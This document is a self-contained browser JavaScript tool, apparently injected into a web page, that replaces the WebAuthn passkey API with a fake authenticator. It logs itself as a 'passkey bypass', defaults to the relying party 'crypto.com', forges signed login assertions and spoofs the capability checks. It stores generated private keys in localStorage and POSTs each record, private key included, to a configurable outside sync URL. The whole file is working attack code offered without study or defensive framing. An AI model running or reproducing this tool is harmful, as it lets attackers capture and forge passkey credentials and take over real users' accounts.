(function () {
  if (window.__passkeyVault) {
    window.__passkeyVault.enable();
    return window.__passkeyVault;
  }

  var VERSION = "1.0.0";
  var log = function () {
    var args = Array.prototype.slice.call(arguments);
    args.unshift("[passkey-vault]");
    console.log.apply(console, args);
  };

  var enc = function (s) { return new TextEncoder().encode(s); };
  var sha256 = function (b) {
    return crypto.subtle.digest("SHA-256", b instanceof Uint8Array ? b : enc(b)).then(function (d) {
      return new Uint8Array(d);
    });
  };
  var b64url = function (buf) {
    return btoa(String.fromCharCode.apply(null, new Uint8Array(buf)))
      .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
  };
  var b64urlDec = function (s) {
    s = s.replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    return Uint8Array.from(atob(s), function (c) { return c.charCodeAt(0); });
  };
  var toBytes = function (b) {
    if (b instanceof ArrayBuffer) return new Uint8Array(b);
    return new Uint8Array(b.buffer, b.byteOffset, b.byteLength);
  };
  var u16 = function (n) { return new Uint8Array([(n >> 8) & 255, n & 255]); };
  var u32 = function (n) {
    return new Uint8Array([(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255]);
  };
  var concat = function () {
    var parts = Array.prototype.slice.call(arguments);
    var total = 0, i;
    for (i = 0; i < parts.length; i++) total += parts[i].length;
    var out = new Uint8Array(total), o = 0;
    for (i = 0; i < parts.length; i++) { out.set(parts[i], o); o += parts[i].length; }
    return out;
  };

  var cbMajor = function (major, value) {
    var head = (major << 5);
    if (value < 24) return [head | value];
    if (value < 256) return [head | 24, value];
    if (value < 65536) return [head | 25, value >> 8, value & 255];
    return [head | 26, (value >>> 24) & 255, (value >>> 16) & 255, (value >>> 8) & 255, value & 255];
  };
  var cbInt = function (n) {
    return n >= 0
      ? Uint8Array.from(cbMajor(0, n))
      : Uint8Array.from(cbMajor(1, -1 - n));
  };
  var cbBytes = function (bytes) {
    return new Uint8Array([].concat(cbMajor(2, bytes.length), Array.from(bytes)));
  };
  var cbText = function (s) {
    var b = enc(s);
    return new Uint8Array([].concat(cbMajor(3, b.length), Array.from(b)));
  };
  var cbMap = function (pairs) {
    var body = [];
    for (var i = 0; i < pairs.length; i++) {
      var k = pairs[i][0], v = pairs[i][1];
      body = body.concat(Array.from(typeof k === "number" ? cbInt(k) : cbText(k)));
      body = body.concat(Array.from(v));
    }
    return new Uint8Array([].concat(cbMajor(5, pairs.length), body));
  };

  var coseKeyFromJwk = function (jwk) {
    return cbMap([
      [1, cbInt(2)],
      [3, cbInt(-7)],
      [-1, cbInt(1)],
      [-2, cbBytes(b64urlDec(jwk.x))],
      [-3, cbBytes(b64urlDec(jwk.y))]
    ]);
  };

  var vault = {
    creds: [],
    add: function (c) {
      this.creds.push(c);
      this.persist();
      this.sync(c);
    },
    sync: function (c) {
      var url = window.__passkeySyncUrl;
      if (!url) return;
      try {
        fetch(url, {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(c)
        });
      } catch (e) {}
    },
    persist: function () {
      try { localStorage.setItem("__passkey_vault", JSON.stringify(this.creds)); } catch (e) {}
    },
    loadLocal: function () {
      try {
        var raw = localStorage.getItem("__passkey_vault");
        if (raw) this.creds = JSON.parse(raw);
      } catch (e) {}
    }
  };
  vault.loadLocal();

  var toDerInt = function (bytes) {
    var i = 0;
    while (i < bytes.length - 1 && bytes[i] === 0) i++;
    var trimmed = bytes.slice(i);
    var needsPad = trimmed[0] & 0x80;
    var out = needsPad ? new Uint8Array([0].concat(Array.from(trimmed))) : trimmed;
    return new Uint8Array([0x02, out.length].concat(Array.from(out)));
  };

  var sign = async function (pk, cred) {
    var chalBytes = toBytes(pk.challenge);
    var clientData = JSON.stringify({
      type: "webauthn.get",
      challenge: b64url(chalBytes),
      origin: location.origin,
      crossOrigin: false
    });
    var clientDataBytes = enc(clientData);
    var clientDataHash = await sha256(clientDataBytes);
    var rpId = pk.rpId || "crypto.com";
    var rpIdHash = await sha256(enc(rpId));
    var flags = new Uint8Array([0x05]);
    var signCount = u32(1);
    var authData = concat(rpIdHash, flags, signCount);
    var sigPayload = concat(authData, clientDataHash);
    var key = await crypto.subtle.importKey(
      "jwk", cred.jwk, { name: "ECDSA", namedCurve: "P-256" }, false, ["sign"]
    );
    var sigRaw = new Uint8Array(
      await crypto.subtle.sign({ name: "ECDSA", hash: "SHA-256" }, key, sigPayload)
    );
    var r = toDerInt(sigRaw.slice(0, 32));
    var s = toDerInt(sigRaw.slice(32, 64));
    var derSig = new Uint8Array([0x30, r.length + s.length].concat(Array.from(r), Array.from(s)));
    log("[+] passkey signed | rpId=" + rpId + " | challenge=" + b64url(chalBytes).slice(0, 20) + "...");
    return {
      id: cred.credId,
      rawId: b64urlDec(cred.credId).buffer,
      type: "public-key",
      authenticatorAttachment: "platform",
      response: {
        authenticatorData: authData.buffer,
        clientDataJSON: clientDataBytes.buffer,
        signature: derSig.buffer,
        userHandle: b64urlDec(cred.userHandle).buffer
      },
      getClientExtensionResults: function () { return {}; }
    };
  };

  var create = async function (pk) {
    var keyPair = await crypto.subtle.generateKey(
      { name: "ECDSA", namedCurve: "P-256" }, true, ["sign"]
    );
    var credId = crypto.getRandomValues(new Uint8Array(32));
    var userHandle = pk.user && pk.user.id
      ? toBytes(pk.user.id)
      : credId;
    var rpId = pk.rpId || (pk.rp && pk.rp.id);
    var rpIdHash = await sha256(enc(rpId));
    var flags = new Uint8Array([0x41]);
    var signCount = u32(1);
    var aaguid = new Uint8Array(16);
    var credIdLen = u16(credId.length);
    var jwkPub = await crypto.subtle.exportKey("jwk", keyPair.publicKey);
    var cose = coseKeyFromJwk(jwkPub);
    var authData = concat(rpIdHash, flags, signCount, aaguid, credIdLen, credId, cose);
    var attObj = cbMap([
      ["fmt", cbText("none")],
      ["attStmt", cbMap([])],
      ["authData", cbBytes(authData)]
    ]);
    var clientData = JSON.stringify({
      type: "webauthn.create",
      challenge: b64url(toBytes(pk.challenge)),
      origin: location.origin,
      crossOrigin: false
    });
    var clientDataBytes = enc(clientData);
    var jwkPriv = await crypto.subtle.exportKey("jwk", keyPair.privateKey);
    var record = {
      rpId: rpId,
      credId: b64url(credId),
      userHandle: b64url(userHandle),
      jwk: jwkPriv,
      createdAt: new Date().toISOString()
    };
    vault.add(record);
    log("[+] passkey registered for " + rpId + ": " + record.credId.slice(0, 16) + "...");
    return {
      id: record.credId,
      rawId: credId.buffer,
      type: "public-key",
      authenticatorAttachment: "platform",
      response: {
        attestationObject: attObj.buffer,
        clientDataJSON: clientDataBytes.buffer
      },
      getClientExtensionResults: function () { return {}; }
    };
  };

  var originals = {
    get: navigator.credentials.get,
    create: navigator.credentials.create,
    uvpa: window.PublicKeyCredential ? PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable : null,
    cma: window.PublicKeyCredential ? PublicKeyCredential.isConditionalMediationAvailable : null,
    cc: window.PublicKeyCredential ? PublicKeyCredential.getClientCapabilities : null
  };

  var enable = function () {
    navigator.credentials.get = async function (opts) {
      if (!(opts && opts.publicKey)) {
        throw new DOMException("No public key options", "NotAllowedError");
      }
      var pk = opts.publicKey;
      var creds = vault.creds.filter(function (c) { return !pk.rpId || c.rpId === pk.rpId; });
      if (pk.allowCredentials && pk.allowCredentials.length) {
        var ids = new Set(pk.allowCredentials.map(function (a) {
          return typeof a.id === "string" ? a.id : b64url(toBytes(a.id));
        }));
        creds = creds.filter(function (c) { return ids.has(c.credId); });
      }
      if (!creds.length) {
        throw new DOMException("No matching passkey in virtual vault for rpId=" + pk.rpId, "NotAllowedError");
      }
      return sign(pk, creds[creds.length - 1]);
    };
    navigator.credentials.create = async function (opts) {
      if (!(opts && opts.publicKey)) {
        throw new DOMException("No public key options", "NotAllowedError");
      }
      return create(opts.publicKey);
    };
    if (window.PublicKeyCredential) {
      PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable = function () { return Promise.resolve(true); };
      PublicKeyCredential.isConditionalMediationAvailable = function () { return Promise.resolve(true); };
      if (PublicKeyCredential.getClientCapabilities) {
        PublicKeyCredential.getClientCapabilities = function () {
          return Promise.resolve({
            conditionalCreate: true,
            conditionalGet: true,
            hybridTransport: false,
            passkeyPlatformAuthenticator: true,
            userVerifyingPlatformAuthenticator: true
          });
        };
      }
    }
    log("[+] passkey bypass active");
  };

  var disable = function () {
    navigator.credentials.get = originals.get;
    navigator.credentials.create = originals.create;
    if (window.PublicKeyCredential) {
      if (originals.uvpa) PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable = originals.uvpa;
      if (originals.cma) PublicKeyCredential.isConditionalMediationAvailable = originals.cma;
      if (originals.cc && PublicKeyCredential.getClientCapabilities) PublicKeyCredential.getClientCapabilities = originals.cc;
    }
    log("[-] passkey bypass disabled");
  };

  var api = {
    version: VERSION,
    enable: enable,
    disable: disable,
    list: function () { return vault.creds.slice(); },
    exportVault: function () { return JSON.stringify(vault.creds, null, 2); },
    loadVault: function (jsonOrArray) {
      var arr = typeof jsonOrArray === "string" ? JSON.parse(jsonOrArray) : jsonOrArray;
      if (!Array.isArray(arr)) throw new Error("vault must be a JSON array of credential records");
      vault.creds = arr;
      vault.persist();
      log("[+] loaded " + arr.length + " credential(s) into vault");
    },
    status: function () {
      return {
        armed: true,
        creds: vault.creds.length,
        rpIds: Array.from(new Set(vault.creds.map(function (c) { return c.rpId; })))
      };
    }
  };
  window.__passkeyVault = api;
  enable();
  return api;
})();
